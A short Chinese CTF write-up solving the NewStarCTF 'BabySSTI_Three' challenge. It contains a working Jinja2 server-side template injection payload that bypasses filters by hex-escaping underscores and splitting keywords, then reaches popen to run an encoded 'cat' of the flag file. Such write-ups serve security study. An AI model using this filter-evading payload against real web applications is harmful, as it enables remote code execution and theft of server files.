---
title: '[NewStarCTF 公开赛赛道]BabySSTI_Three'
date: 2025-01-22 20:34:59
tags: ssti
categories: 刷题笔记
---

## [NewStarCTF 公开赛赛道]BabySSTI_Three

我们先看看是什么模版

```
?name={{7*7}}
```

![image-20250122204410941](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202501222044081.png)

我们猜测为jinjia2模版

经过测试，该题过滤了下划线，冒号和空格和class啥的关键字

空格我们用[]绕过，下滑线用16进制绕过

得到

```
payload：?name={{[]['\x5f\x5fcl''ass\x5f\x5f']['\x5f\x5fba''se\x5f\x5f']['\x5f\x5fsubc''lasses\x5f\x5f']()[117]['\x5f\x5fin''it\x5f\x5f']['\x5f\x5fglo''bals\x5f\x5f']['po''pen']('\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u005f\u0069\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0035\u0032\u0064\u0061\u0061\u0064').read()}}
```

得到flag

![image-20250122204715465](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202501222047581.png)

或者直接用fenjing一把梭也能得到flag
